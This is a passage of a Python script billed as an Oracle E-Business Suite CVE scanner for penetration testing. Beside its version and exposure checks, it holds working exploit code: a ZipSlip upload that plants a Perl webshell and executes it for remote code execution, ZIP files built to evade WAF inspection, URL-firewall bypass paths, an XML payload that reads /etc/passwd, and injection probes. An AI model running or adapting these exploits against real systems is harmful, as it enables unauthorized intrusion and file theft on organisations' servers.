#!/usr/bin/env python3
"""
Oracle EBS CVE Scanner v2.0
Security Assessment Tool for Oracle E-Business Suite

Usage:
  python3 oracle_ebs_scan.py --target <host>
  python3 oracle_ebs_scan.py --target 10.x.x.x --internal
  python3 oracle_ebs_scan.py --target <host> --internal --wls-port 7201

Flags:
  --target    Target hostname or IP (required)
  --port      HTTPS port (default 443)
  --internal  Enable internal tests: direct WLS port access + RCE attempt
  --wls-port  WebLogic managed server port for internal tests (default 7201)
  --no-rce    Skip RCE attempt even in internal mode
  --proxy     HTTP proxy e.g. http://127.0.0.1:8080

RCE is strictly limited to: whoami, id, hostname, uname -a
"""

import sys, os, io, struct, zlib, zipfile, base64, ssl
import urllib.request, urllib.parse, urllib.error
import socket, time, argparse, json, textwrap
from datetime import datetime

# ──────────────────────────────────────────────────────────────────────────────
# ANSI colors
# ──────────────────────────────────────────────────────────────────────────────
R  = '\033[91m'; Y  = '\033[93m'; G  = '\033[92m'
B  = '\033[94m'; M  = '\033[95m'; C  = '\033[96m'
W  = '\033[97m'; BD = '\033[1m';  RS = '\033[0m'

def crit(m):  print(f"\n{BD}{R}[★ CRITICAL]{RS} {m}")
def high(m):  print(f"{R}[▲ HIGH    ]{RS} {m}")
def med(m):   print(f"{Y}[● MEDIUM  ]{RS} {m}")
def low(m):   print(f"{C}[○ LOW     ]{RS} {m}")
def ok(m):    print(f"{G}[✓ SAFE    ]{RS} {m}")
def info(m):  print(f"{B}[i INFO    ]{RS} {m}")
def run(m):   print(f"{M}[→ TESTING ]{RS} {m}")
def step(m):  print(f"\n{BD}{W}{'─'*60}{RS}\n{BD}{W}  {m}{RS}\n{BD}{W}{'─'*60}{RS}")
def pwn(m):
    print(f"\n{BD}{R}{'═'*60}{RS}")
    print(f"{BD}{R}  [★ VULNERABLE - CONFIRMED RCE]{RS}")
    print(f"{BD}{R}{'═'*60}{RS}")
    print(m)
    print(f"{BD}{R}{'═'*60}{RS}\n")

RESULTS = []  # (severity, cve, message)

def record(severity, cve, msg):
    RESULTS.append((severity, cve, msg))

# ──────────────────────────────────────────────────────────────────────────────
# HTTP helpers
# ──────────────────────────────────────────────────────────────────────────────
_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE
PROXY = None

def _opener(follow_redirects=False):
    handlers = [urllib.request.HTTPSHandler(context=_ctx)]
    if PROXY:
        handlers.insert(0, urllib.request.ProxyHandler({'https': PROXY, 'http': PROXY}))
    if not follow_redirects:
        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *a, **kw): return None
        handlers.append(NoRedirect())
    return urllib.request.build_opener(*handlers)

UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125 Safari/537.36'

def req(url, method='GET', data=None, hdrs=None, timeout=15, follow=False):
    h = {'User-Agent': UA}
    if hdrs: h.update(hdrs)
    if isinstance(data, str): data = data.encode()
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        resp = _opener(follow).open(r, timeout=timeout)
        body = resp.read()
        return resp.status, dict(resp.headers), body.decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='replace') if e.fp else ''
        return e.code, dict(e.headers), body
    except Exception as e:
        return 0, {}, str(e)

def url(target, port, path, scheme='https'):
    p = f":{port}" if port not in (443, 80) else ''
    return f"{scheme}://{target}{p}{path}"

# ──────────────────────────────────────────────────────────────────────────────
# ZIP / UUEncode builders
# ──────────────────────────────────────────────────────────────────────────────
WEBSHELL = b"""#!/usr/bin/perl
# AUTHORIZED PENTEST - Internal Assessment
print "Content-type: text/plain\\r\\n\\r\\n";
my $hn = `hostname 2>&1`; chomp $hn;
my $wu = `whoami 2>&1`;   chomp $wu;
my $id = `id 2>&1`;       chomp $id;
my $un = `uname -a 2>&1`; chomp $un;
print "===PENTEST-EVIDENCE===\\n";
print "hostname: $hn\\n";
print "whoami:   $wu\\n";
print "id:       $id\\n";
print "uname:    $un\\n";
print "===END-EVIDENCE===\\n";
# STRICTLY LIMITED: NO further commands, NO lateral movement, NO data exfil
"""

# Traversal paths to try (most likely to least likely)
TRAVERSAL_PATHS = [
    b"../../../../../FMW_Home/Oracle_EBS-app1/common/scripts/txkFNDWRR.pl",
    b"../../../../../../FMW_Home/Oracle_EBS-app1/common/scripts/txkFNDWRR.pl",
    b"../../../../../u01/install/APPS/fs2/EBSapps/comn/scripts/txkFNDWRR.pl",
    b"../../../../../u01/install/APPS/fs1/EBSapps/comn/scripts/txkFNDWRR.pl",
]

def make_standard_zip(traversal_path, content):
    """Standard zip for internal use (no WAF bypass needed)"""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(traversal_path.decode(), content)
    return buf.getvalue()

def make_waf_bypass_zip(traversal_path, content):
    """WAF bypass: safe local header + traversal in central directory"""
    safe_name = b"upload.tmp"
    raw = content if isinstance(content, bytes) else content.encode()
    compressed = zlib.compress(raw)[2:-4]
    crc = zlib.crc32(raw) & 0xFFFFFFFF
    p16 = lambda x: struct.pack('<H', x)
    p32 = lambda x: struct.pack('<L', x)

    lhdr = (b'PK\x03\x04' + p16(20) + p16(0) + p16(8) +
            p16(0)*2 + p32(crc) + p32(len(compressed)) + p32(len(raw)) +
            p16(len(safe_name)) + p16(0))
    data_section = lhdr + safe_name + compressed
    offset = len(data_section)

    cdent = (b'PK\x01\x02' + p16(20)*2 + p16(0) + p16(8) +
             p16(0)*2 + p32(crc) + p32(len(compressed)) + p32(len(raw)) +
             p16(len(traversal_path)) + p16(0)*5 + p32(0o644<<16) + p32(0))
    cd_section = cdent + traversal_path

    eocd = (b'PK\x05\x06' + p16(0)*2 + p16(1)*2 +
            p32(len(cd_section)) + p32(len(data_section)) + p16(0))
    return data_section + cd_section + eocd

def make_buffer_bypass_zip(traversal_path, content, pad_size=150_000):
    """WAF bypass: traversal entry past 128KB inspection window"""
    raw = content if isinstance(content, bytes) else content.encode()
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        info = zipfile.ZipInfo("padding.dat")
        info.compress_type = zipfile.ZIP_STORED
        zf.writestr(info, b"P" * pad_size)
        zf.writestr(traversal_path.decode(), raw)
    return buf.getvalue()

def uuencode_zip(zip_bytes):
    """UUEncode ZIP for BneUploaderService — pure stdlib, no uu module (removed in Python 3.13)"""
    def _uu_encode_line(chunk):
        count = len(chunk)
        # Pad to multiple of 3
        pad = (3 - count % 3) % 3
        chunk = chunk + b'\x00' * pad
        encoded = []
        for i in range(0, len(chunk), 3):
            b0, b1, b2 = chunk[i], chunk[i+1], chunk[i+2]
            encoded.append(((b0 >> 2) & 0x3F) + 32)
            encoded.append((((b0 << 4) | (b1 >> 4)) & 0x3F) + 32)
            encoded.append((((b1 << 2) | (b2 >> 6)) & 0x3F) + 32)
            encoded.append((b2 & 0x3F) + 32)
        # Replace space (32) with backtick (96) for compatibility
        return bytes((96 if c == 32 else c) for c in [(count + 32 if count > 0 else 96)] + encoded)

    out = io.BytesIO()
    out.write(b"begin 644 upload.zip\n")
    data = zip_bytes
    i = 0
    while i < len(data):
        chunk = data[i:i+45]
        out.write(_uu_encode_line(chunk) + b"\n")
        i += 45
    out.write(b"`\nend\n")
    return out.getvalue()

# ──────────────────────────────────────────────────────────────────────────────
# CVE Tests
# ──────────────────────────────────────────────────────────────────────────────

def test_connectivity(target, port):
    step("CONNECTIVITY CHECK")
    run(f"Probing {target}:{port} ...")
    code, hdrs, body = req(url(target, port, '/OA_HTML/AppsLocalLogin.jsp'), timeout=10)
    if code == 200 and 'Oracle' in body:
        ok(f"Target reachable — Oracle EBS login page confirmed (HTTP {code})")
        # Extract version from JS filename
        import re
        v = re.search(r'Common(\d+_\d+_\d+_\d+_\d+)\.js', body)
        if v:
            ver = v.group(1).replace('_', '.')
            info(f"Oracle EBS version: {ver}")
            return True, ver
        return True, "unknown"
    elif code == 0:
        high(f"Cannot reach target: {body}")
        return False, None
    else:
        info(f"Unexpected response HTTP {code} — continuing anyway")
        return True, "unknown"

def test_cve_2022_21587_detection(target, port):
    """Check if BneUploaderService is accessible and determine patch status"""
    step("CVE-2022-21587 — Oracle Web ADI ZipSlip RCE (CVSS 9.8)")
    run("Checking BneUploaderService accessibility ...")

    # Test 1: BneUploaderService GET
    code, hdrs, body = req(url(target, port, '/OA_HTML/BneUploaderService'), timeout=10)
    if code == 410:
        ok("BneUploaderService blocked by URL Firewall (HTTP 410) — attack surface not exposed")
        record('LOW', 'CVE-2022-21587', 'BneUploaderService blocked by URL Firewall')
        return 'blocked'
    if code != 200:
        info(f"BneUploaderService returned HTTP {code}")
        return 'unknown'

    info(f"BneUploaderService accessible (HTTP {code}, {len(body)} bytes)")

    # Test 2: Determine if auth check is before or after extraction
    run("Testing auth-before-extraction (patch detection) ...")
    code2, _, body2 = req(
        url(target, port, '/OA_HTML/BneUploaderService?bne:uueupload=true'),
        method='POST', data=b'NOTAUUEFILE', timeout=10,
        hdrs={'Content-Type': 'text/plain'}
    )
    run("Sending empty body ...")
    code3, _, body3 = req(
        url(target, port, '/OA_HTML/BneUploaderService?bne:uueupload=true'),
        method='POST', data=b'', timeout=10,
        hdrs={'Content-Type': 'text/plain'}
    )

    empty_resp   = 'Cannot be logged in as GUEST' in body3
    garbage_resp = 'Cannot be logged in as GUEST' in body2

    if empty_resp and garbage_resp:
        ok("Auth check runs BEFORE extraction — October 2022 CPU patch IS applied")
        ok("CVE-2022-21587: NOT exploitable via unauthenticated path")
        record('LOW', 'CVE-2022-21587', 'Code-level patch applied (auth before extraction confirmed)')
        return 'patched'
    else:
        high("Auth check may run AFTER extraction — system may be UNPATCHED!")
        info(f"  Empty body response:   {body3[:80]!r}")
        info(f"  Garbage body response: {body2[:80]!r}")
        record('CRITICAL', 'CVE-2022-21587', 'Auth check order unclear — may be unpatched')
        return 'possibly_unpatched'

def attempt_rce_2022_21587(target, port, wls_port):
    """
    CVE-2022-21587 ZipSlip RCE — INTERNAL MODE ONLY
    Strictly limited to: whoami / id / hostname / uname -a
    """
    step("CVE-2022-21587 — ZipSlip RCE ATTEMPT (INTERNAL)")
    print(f"{Y}  RCE is strictly limited to: whoami, id, hostname, uname -a{RS}")
    print(f"{Y}  No lateral movement. No data exfiltration. Authorized test only.{RS}\n")

    for trav_path in TRAVERSAL_PATHS:
        run(f"Trying traversal path: {trav_path.decode()}")

        # Build standard ZIP (no WAF internally)
        zip_bytes = make_standard_zip(trav_path, WEBSHELL)
        uue_data  = uuencode_zip(zip_bytes)

        run(f"Uploading ZipSlip payload ({len(uue_data)} bytes UUE)...")
        code, hdrs, body = req(
            url(target, port, '/OA_HTML/BneUploaderService?bne:uueupload=true'),
            method='POST',
            data=uue_data,
            hdrs={'Content-Type': 'text/plain'},
            timeout=30
        )
        info(f"Upload response: HTTP {code} — {body[:100]!r}")

        # Execute via FNDWRR.exe (no CMD header needed — webshell runs on any request)
        run("Executing webshell via FNDWRR.exe ...")
        time.sleep(1)

        for scheme in ['https', 'http']:
            exec_url = url(target, port, '/OA_CGI/FNDWRR.exe', scheme=scheme)
            code2, _, body2 = req(exec_url, timeout=15)
            if 'PENTEST-EVIDENCE' in body2:
                pwn(body2)
                record('CRITICAL', 'CVE-2022-21587',
                       f'RCE confirmed via ZipSlip. Path: {trav_path.decode()}\n{body2}')
                return True

            # Also try internal WLS port
            if wls_port:
                for wls_scheme in ['http', 'https']:
                    wls_url = url(target, wls_port, '/OA_CGI/FNDWRR.exe', scheme=wls_scheme)
                    code3, _, body3 = req(wls_url, timeout=10)
                    if 'PENTEST-EVIDENCE' in body3:
                        pwn(body3)
                        record('CRITICAL', 'CVE-2022-21587',
                               f'RCE confirmed via ZipSlip on WLS port {wls_port}.\n{body3}')
                        return True

        info(f"No execution via path {trav_path.decode()[:40]}... (trying next)")

    # Try WAF bypass versions in case staging has WAF
    run("Trying WAF bypass zip (central directory mismatch) ...")
    for trav_path in TRAVERSAL_PATHS[:2]:
        zip_bytes = make_waf_bypass_zip(trav_path, WEBSHELL)
        uue_data  = uuencode_zip(zip_bytes)
        code, _, body = req(
            url(target, port, '/OA_HTML/BneUploaderService?bne:uueupload=true'),
            method='POST', data=uue_data,
            hdrs={'Content-Type': 'text/plain'}, timeout=30
        )
        if code == 200 and 'Cannot' in body:
            run("WAF bypass upload: HTTP 200 received, checking execution ...")
            time.sleep(1)
            code2, _, body2 = req(url(target, port, '/OA_CGI/FNDWRR.exe'), timeout=15)
            if 'PENTEST-EVIDENCE' in body2:
                pwn(body2)
                record('CRITICAL', 'CVE-2022-21587',
                       f'RCE via WAF bypass + ZipSlip confirmed.\n{body2}')
                return True

    high("ZipSlip upload reached server but webshell execution not confirmed")
    high("Possible reasons: wrong traversal path, code patch applied, file not executed")
    record('HIGH', 'CVE-2022-21587', 'ZipSlip upload succeeded but execution not confirmed — check traversal path')
    return False

def test_cve_2025_30727(target, port, wls_port, internal):
    """CVE-2025-30727 — iSurvey RCE (CVSS 9.8, April 2025 CPU)"""
    step("CVE-2025-30727 — Oracle Scripting iSurvey RCE (CVSS 9.8)")

    paths = [
        '/OA_HTML/ieshostedsurvey.jsp',
        '/OA_HTML/iessurveyruntimeegraph.jsp',
        '/OA_HTML/iesSurveyRuntime.jsp',
    ]

    # External check
    for p in paths:
        run(f"Testing {p} on port {port}...")
        code, _, body = req(url(target, port, p), timeout=10)
        if code == 200:
            high(f"ieshostedsurvey.jsp accessible on port {port}! CVE-2025-30727 surface EXPOSED")
            record('CRITICAL', 'CVE-2025-30727', f'iSurvey JSP accessible without auth on port {port}')
            _probe_isur_rce(target, port, p)
            return
        elif code == 410:
            info(f"  {p} → HTTP 410 (URL Firewall blocked)")
        else:
            info(f"  {p} → HTTP {code}")

    # URL Firewall bypass test
    run("Testing URL Firewall bypass via %2f encoding ...")
    bypaths = [
        '/OA_HTML/help%2f..%2fieshostedsurvey.jsp',
        '/OA_HTML/cabo%2f..%2fieshostedsurvey.jsp',
    ]
    for p in bypaths:
        code, _, body = req(url(target, port, p), timeout=10)
        info(f"  %2f bypass {p} → HTTP {code} size={len(body)}")
        if code == 200 and len(body) > 500:
            high(f"URL Firewall bypass reached ieshostedsurvey.jsp!")
            record('HIGH', 'CVE-2025-30727', f'URL Firewall bypass reached iSurvey JSP: {p}')

    # Internal WLS port test
    if internal and wls_port:
        run(f"Testing direct WLS port {wls_port} for ieshostedsurvey.jsp ...")
        for scheme in ['http', 'https']:
            for p in paths:
                code, _, body = req(url(target, wls_port, p, scheme=scheme), timeout=10)
                info(f"  [{scheme}:{wls_port}] {p} → HTTP {code} size={len(body)}")
                if code == 200 and len(body) > 200:
                    high(f"ieshostedsurvey.jsp ACCESSIBLE on internal WLS port {wls_port}!")
                    record('CRITICAL', 'CVE-2025-30727',
                           f'iSurvey accessible on WLS:{wls_port} — probe for CVE-2025-30727 RCE')
                    _probe_isur_rce(target, wls_port, p, scheme=scheme)
                    return

    ok("CVE-2025-30727: ieshostedsurvey.jsp not reachable from this network position")
    record('MEDIUM', 'CVE-2025-30727', 'Module present (OA.jsp returns HTTP 200), JSP blocked externally — verify internal port access')

def _probe_isur_rce(target, port, path, scheme='https'):
    """Basic CVE-2025-30727 probe — POST with malformed surveyId"""
    run("Probing iSurvey for parameter injection ...")
    import re
    for payload in ["'", "1 OR 1=1", "../../etc/passwd"]:
        code, _, body = req(
            url(target, port, path + f"?surveyId={urllib.parse.quote(payload)}", scheme=scheme),
            timeout=10
        )
        if any(kw in body for kw in ['ORA-', 'SQLException', 'root:', 'PENTEST']):
            high(f"iSurvey responded to payload {payload!r}: {body[:200]}")
        else:
            info(f"  surveyId={payload!r} → HTTP {code} ({len(body)} bytes)")

def test_cve_2025_61882(target, port, wls_port, internal):
    """CVE-2025-61882 — UiServlet SSRF chain RCE (CVSS 9.8)"""
    step("CVE-2025-61882 — Configurator UiServlet SSRF→RCE Chain (CVSS 9.8)")

    # External
    code, _, body = req(url(target, port, '/OA_HTML/configurator/UiServlet'), timeout=10)
    if code == 410:
        info("UiServlet → HTTP 410 (URL Firewall blocks)")
    elif code == 200:
        high("UiServlet accessible without auth! Chain possible.")
        record('CRITICAL', 'CVE-2025-61882', 'UiServlet accessible — full chain possible')
        return

    # URL Firewall bypass
    run("Testing %2f bypass for UiServlet ...")
    code, _, body = req(url(target, port, '/OA_HTML/configurator%2fUiServlet'), timeout=10)
    info(f"  %2f bypass → HTTP {code} size={len(body)}")
    if code == 200 and len(body) > 800:
        high("URL Firewall bypass reached UiServlet!")
        record('HIGH', 'CVE-2025-61882', 'UiServlet reachable via %2f URL Firewall bypass')
    elif code == 404 and len(body) > 1000:
        info("  WebLogic 404 (bypass works, servlet not at this path)")
    elif code == 404 and len(body) < 300:
        info("  Apache 404 (bypass hit OHS, not WebLogic)")

    # Internal WLS port
    if internal and wls_port:
        run(f"Testing UiServlet directly on WLS port {wls_port} ...")
        for scheme in ['http', 'https']:
            code2, _, body2 = req(
                url(target, wls_port, '/OA_HTML/configurator/UiServlet', scheme=scheme),
                timeout=10
            )
            info(f"  WLS [{scheme}:{wls_port}] → HTTP {code2} size={len(body2)}")
            if code2 in (200, 500) and len(body2) > 100:
                high(f"UiServlet reachable on WLS port! CVE-2025-61882 chain entry point available.")
                record('CRITICAL', 'CVE-2025-61882',
                       f'UiServlet accessible on WLS:{wls_port} — SSRF chain possible')
                run("Testing SyncServlet (Stage 2 of chain) ...")
                code3, _, body3 = req(
                    url(target, wls_port, '/OA_HTML/SyncServlet', scheme=scheme),
                    method='POST', timeout=10,
                    hdrs={'Content-Type': 'application/xml'},
                    data=b'<sync/>'
                )
                info(f"  SyncServlet → HTTP {code3} size={len(body3)}")
                return

    ok("CVE-2025-61882: UiServlet not reachable from this network position")
    record('MEDIUM', 'CVE-2025-61882', 'UiServlet blocked by URL Firewall — internal WLS access required for chain')

def test_cve_2026_46817(target, port, wls_port, internal):
    """CVE-2026-46817 — ibytransmit pre-auth file read (CVSS 9.8)"""
    step("CVE-2026-46817 — Oracle Payments ibytransmit File Read (CVSS 9.8)")

    code, _, body = req(url(target, port, '/OA_HTML/ibytransmit'), timeout=10)
    if code == 410:
        info("ibytransmit → HTTP 410 (URL Firewall blocks)")
    elif code == 200:
        high("ibytransmit accessible! Probe for CVE-2026-46817")
        _probe_ibytransmit(target, port, '/OA_HTML/ibytransmit')
        record('CRITICAL', 'CVE-2026-46817', 'ibytransmit endpoint accessible — probe for file read')
        return

    # %2f bypass
    run("Testing URL Firewall bypass for ibytransmit ...")
    code2, _, body2 = req(url(target, port, '/OA_HTML/help%2f..%2fibytransmit'), timeout=10)
    info(f"  %2f bypass → HTTP {code2} size={len(body2)}")
    if code2 == 200 and len(body2) > 500:
        high("ibytransmit reachable via URL Firewall bypass!")
        record('HIGH', 'CVE-2026-46817', 'ibytransmit reachable via %2f bypass')

    if internal and wls_port:
        run(f"Testing ibytransmit on WLS port {wls_port} ...")
        for scheme in ['http', 'https']:
            code3, _, body3 = req(
                url(target, wls_port, '/OA_HTML/ibytransmit', scheme=scheme), timeout=10
            )
            info(f"  WLS [{scheme}:{wls_port}] ibytransmit → HTTP {code3} size={len(body3)}")
            if code3 == 200:
                high(f"ibytransmit accessible on internal WLS port!")
                record('CRITICAL', 'CVE-2026-46817', f'ibytransmit accessible on WLS:{wls_port}')
                _probe_ibytransmit(target, wls_port, '/OA_HTML/ibytransmit', scheme=scheme)
                return

    ok("CVE-2026-46817: ibytransmit not reachable from this network position")
    record('LOW', 'CVE-2026-46817', 'ibytransmit blocked by URL Firewall')

def _probe_ibytransmit(target, port, path, scheme='https'):
    run("Probing ibytransmit for file read (CVE-2026-46817) ...")
    # CVE-2026-46817 reads arbitrary files via XML body with fileLocation
    xml_payload = b"""<?xml version="1.0"?>
<IBYBatchPaymentRequestDTO>
  <fileLocation>/etc/passwd</fileLocation>
</IBYBatchPaymentRequestDTO>"""
    code, _, body = req(
        url(target, port, path, scheme=scheme),
        method='POST', data=xml_payload,
        hdrs={'Content-Type': 'application/xml'}, timeout=15
    )
    if any(kw in body for kw in ['root:', '/bin/', 'nobody:', 'daemon:']):
        pwn(f"CVE-2026-46817 FILE READ CONFIRMED!\n{body[:500]}")
        record('CRITICAL', 'CVE-2026-46817', f'/etc/passwd contents exposed:\n{body[:300]}')
    else:
        info(f"  ibytransmit POST → HTTP {code} ({len(body)} bytes)")
        info(f"  Body: {body[:200]!r}")

def test_cve_2025_53072(target, port, internal):
    """CVE-2025-53072/62481 — Marketing Admin pre-auth RCE (CVSS 9.8)"""
    step("CVE-2025-53072 / CVE-2025-62481 — Marketing Admin RCE (CVSS 9.8, Oct 2025 CPU)")

    # Confirm module is installed
    run("Checking if Oracle Marketing module is installed ...")
    code, _, body = req(url(target, port, '/OA_HTML/OA.jsp?OAFunc=AMS_ADMIN'), timeout=10)
    if code == 200 and len(body) > 5000:
        if 'Function not available' in body:
            info("Oracle Marketing module installed — returns 'Function not available' for guest")
        elif 'Error' in body:
            info("Marketing module present but access blocked")
        else:
            high("Marketing module accessible — unexpected response!")
    elif code == 404:
        ok("Marketing module not found (HTTP 404) — CVE may not apply")
        record('LOW', 'CVE-2025-53072', 'Marketing module not installed')
        return
    elif code == 410:
        ok("Marketing path blocked by URL Firewall (HTTP 410)")
        record('LOW', 'CVE-2025-53072', 'Marketing module blocked')
        return

    # Try specific AMS servlet paths (internal access bypasses OA.jsp framework check)
    ams_paths = [
        '/OA_HTML/ams/AmsImport.jsp',
        '/OA_HTML/ams/AmsBatchUpload.jsp',
        '/OA_HTML/ams/AmsXmlService',
        '/OA_HTML/OA.jsp?page=/oracle/apps/ams/utility/server/AmsFetchXmlService&amsAction=EXECUTE',
        '/OA_HTML/OA.jsp?page=/oracle/apps/ams/admin/server/AmsAdminService&method=executeXml',
    ]
    for p in ams_paths:
        code, _, body = req(url(target, port, p), timeout=10)
        info(f"  AMS path {p.split('?')[0][-40:]} → HTTP {code} size={len(body)}")
        if code == 200 and 'function not available' not in body.lower() and len(body) > 100:
            high(f"Unexpected AMS response for {p}!")
            info(f"  Body: {body[:300]!r}")
            record('HIGH', 'CVE-2025-53072', f'Unexpected Marketing servlet response at {p}')

    # Internal: try %2f bypass to reach AMS servlets directly
    if internal:
        run("Internal: testing AMS %2f bypass paths ...")
        for p in ['/OA_HTML/ams%2fAmsImport.jsp', '/OA_HTML/ams%2fAmsBatchUpload.jsp']:
            code, _, body = req(url(target, port, p), timeout=10)
            info(f"  %2f bypass {p} → HTTP {code} size={len(body)}")
            if code == 200 and 'ams' in body.lower():
                high(f"AMS servlet reachable via bypass!")
                record('CRITICAL', 'CVE-2025-53072', f'AMS servlet reached via bypass: {p}')

    med("CVE-2025-53072: Marketing module confirmed installed — patch status unverified")
    med("Recommend: verify Oct 2025 CPU applied (check ad_patch_history as APPS user)")
    record('MEDIUM', 'CVE-2025-53072',
           'Marketing module installed; specific bypass endpoint not disclosed publicly; verify Oct 2025 CPU')

def test_javascript_servlet(target, port):
    """JavaScriptServlet — CSRF token and session ID leak"""
    step("JavaScriptServlet — Unauthenticated CSRF Token / Session Leak")
    run("Requesting CSRF token from JavaScriptServlet ...")
    code, hdrs, body = req(
        url(target, port, '/OA_HTML/JavaScriptServlet'),
        method='POST',
        hdrs={'FETCH-CSRF-TOKEN': '1', 'CSRF-XHR': 'YES'},
        timeout=10
    )
    if code == 200 and 'csrftkn:' in body:
        import re
        tok = re.search(r'csrftkn:([A-Z0-9\-]+)', body)
        jsid = hdrs.get('Set-Cookie', '')
        if tok:
            high(f"CSRF token leaked to unauthenticated caller: {tok.group(1)}")
        if 'JSESSIONID' in jsid:
            high(f"JSESSIONID leaked: {jsid[:80]}...")
        record('HIGH', 'JavaScriptServlet', f'CSRF token leaked: {tok.group(1) if tok else "?"} | JSESSIONID in Set-Cookie')
    elif code == 200:
        info(f"JavaScriptServlet returned HTTP 200 but no CSRF token found")
        record('LOW', 'JavaScriptServlet', 'Endpoint accessible but CSRF not returned')
    else:
        ok(f"JavaScriptServlet returned HTTP {code} (possibly blocked or not exposed)")
        record('LOW', 'JavaScriptServlet', f'HTTP {code} — not leaking tokens')

def test_credential_in_redirect(target, port):
    """Finding 13 — plaintext password in HTTP 302 Location header"""
    step("Credential Exposure — Plaintext Password in HTTP 302 to OAM")
    run("Sending test login POST to AppsLogin ...")
    code, hdrs, body = req(
        url(target, port, '/OA_HTML/AppsLogin'),
        method='POST',
        data='usernameField=PENTEST_USER&passwordField=PENTEST_PASS_VISIBLE',
        hdrs={'Content-Type': 'application/x-www-form-urlencoded'},
        timeout=10
    )
    loc = hdrs.get('Location', '')
    if code in (302, 301) and 'PENTEST_PASS_VISIBLE' in loc:
        high(f"PASSWORD VISIBLE IN REDIRECT URL!")
        high(f"Location: {loc[:200]}")
        record('HIGH', 'Credential-Exposure',
               f'Plaintext password in HTTP {code} Location header: {loc[:200]}')
    elif code in (302, 301):
        info(f"HTTP {code} Location: {loc[:150]}")
        if 'ssologin' in loc or 'sso' in loc:
            med("Redirecting to OAM — check if password appears in Location URL")
            info(f"  Full Location: {loc}")
        record('MEDIUM', 'Credential-Exposure', f'AppsLogin redirects to OAM — verify password not in URL')
    else:
        info(f"AppsLogin returned HTTP {code}")
        record('INFO', 'Credential-Exposure', f'AppsLogin HTTP {code} — not redirecting to OAM as expected')

def test_url_firewall_bypass(target, port):
    """URL Firewall %2f bypass"""
    step("Oracle FND URL Firewall — %2f Encoding Bypass")
    blocked = '/OA_HTML/configurator/UiServlet'
    bypass  = '/OA_HTML/configurator%2fUiServlet'

    run(f"Testing direct path (should be 410) ...")
    c1, _, _ = req(url(target, port, blocked), timeout=10)
    info(f"  Direct: HTTP {c1}")

    run(f"Testing %2f bypass ...")
    c2, _, b2 = req(url(target, port, bypass), timeout=10)
    info(f"  Bypass: HTTP {c2} size={len(b2)}")

    if c1 == 410 and c2 != 410:
        if len(b2) > 1000:
            high(f"URL Firewall bypass CONFIRMED — WebLogic reached (size={len(b2)})")
            record('HIGH', 'URL-Firewall-Bypass', f'%2f bypass reaches WebLogic (HTTP {c2}, {len(b2)} bytes)')
        elif c2 == 404:
            med(f"URL Firewall bypass works but WebLogic returns 404 (servlet not deployed externally)")
            record('MEDIUM', 'URL-Firewall-Bypass', f'%2f bypass bypasses URL Firewall (HTTP {c2})')
    elif c1 != 410:
        info(f"Path not blocked by URL Firewall (HTTP {c1}) — firewall may not be active")

def test_waf_bypass(target, port):
    """Azure WAF ZIP inspection bypass tests"""
    step("Azure WAF — ZIP Body Inspection Bypass Test")
    run("Building 150KB padding ZIP with traversal entry past inspection limit ...")
    # Build a proof zip (safe path, no actual webshell — just testing WAF bypass)
    SAFE_CONTENT = b"PENTEST-WAF-BYPASS-PROBE"
    safe_trav = b"../test_pentest_probe.txt"  # safe path — won't overwrite anything
    zip_bytes = make_buffer_bypass_zip(safe_trav, SAFE_CONTENT)
    uue = uuencode_zip(zip_bytes)
    run(f"Uploading {len(uue)}-byte UUE payload (traversal at offset >128KB) ...")
    code, _, body = req(
        url(target, port, '/OA_HTML/BneUploaderService?bne:uueupload=true'),
        method='POST', data=uue,
        hdrs={'Content-Type': 'text/plain'}, timeout=30
    )
    info(f"  Response: HTTP {code} — {body[:80]!r}")
    if code == 200:
        high(f"WAF buffer bypass: HTTP 200 received (WAF did not block large ZIP with traversal past 128KB)")
        record('HIGH', 'WAF-Bypass', f'Buffer limit bypass: {len(uue)}-byte upload returned HTTP {code}')
    elif code == 502:
        ok("WAF blocked large ZIP upload (HTTP 502) — inspection limit >128KB on this instance")
        record('LOW', 'WAF-Bypass', 'WAF blocked buffer limit bypass attempt (HTTP 502)')
    else:
        info(f"Unexpected response: HTTP {code}")

def test_info_disclosure(target, port):
    """Quick info disclosure checks"""
    step("Information Disclosure — Cookies, Emails, Headers")
    run("Checking OAErrorPage.jsp for cookie attributes ...")
    code, hdrs, body = req(url(target, port, '/OA_HTML/OAErrorPage.jsp'), timeout=10)
    cookies = [v for k, v in hdrs.items() if k.lower() == 'set-cookie']
    # urllib gives only last set-cookie; use raw approach
    for c in str(hdrs).split('Set-Cookie:'):
        if 'EBSSSOCOOKIE' in c or 'EBSAuth' in c or 'JSESSION' in c or 'SSO' in c:
            info(f"  Cookie: {c[:120].strip()}")
            if 'domain=.' in c:
                high(f"Cross-subdomain cookie: {c[:80].strip()}")
                record('HIGH', 'Cookie-Scope', f'Cookie with wildcard domain: {c[:100].strip()}')

    run("Checking 410 page for DBA email disclosure ...")
    code2, _, body2 = req(url(target, port, '/OA_HTML/FNDSQ.exe'), timeout=10)
    import re
    emails = re.findall(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}', body2)
    for e in emails:
        med(f"Email disclosed in URL Firewall error page: {e}")
        record('MEDIUM', 'Info-Disclosure', f'DBA email in URL Firewall 410 page: {e}')

    run("Checking server header disclosure ...")
    code3, hdrs3, _ = req(url(target, port, '/OA_HTML/AppsLocalLogin.jsp'), timeout=10)
    svr = hdrs3.get('Server', hdrs3.get('server', ''))
    if svr:
        info(f"  Server header: {svr}")
    ecid = hdrs3.get('X-ORACLE-DMS-ECID', hdrs3.get('x-oracle-dms-ecid', ''))
    if ecid:
        info(f"  Oracle ECID: {ecid} (internal execution context ID leaked)")
        record('LOW', 'Info-Disclosure', f'Oracle DMS ECID in response headers: {ecid}')

# ──────────────────────────────────────────────────────────────────────────────
# Summary + Main
# ──────────────────────────────────────────────────────────────────────────────

def print_summary(start_time, target):
    elapsed = time.time() - start_time
    print(f"\n\n{BD}{W}{'═'*60}{RS}")
    print(f"{BD}{W}  SCAN SUMMARY — {target}{RS}")
